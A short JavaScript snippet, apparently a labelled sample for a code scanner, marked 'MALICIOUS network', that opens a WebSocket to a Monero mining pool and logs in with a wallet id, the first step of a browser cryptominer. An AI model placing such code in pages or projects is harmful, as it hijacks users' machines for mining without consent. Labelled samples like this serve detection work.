// codesure: MALICIOUS network
const ws = new WebSocket('wss://pool.minexmr.com:443');
ws.onopen = () => ws.send(JSON.stringify({method: 'login', params: {login: 'wallet123'}}));
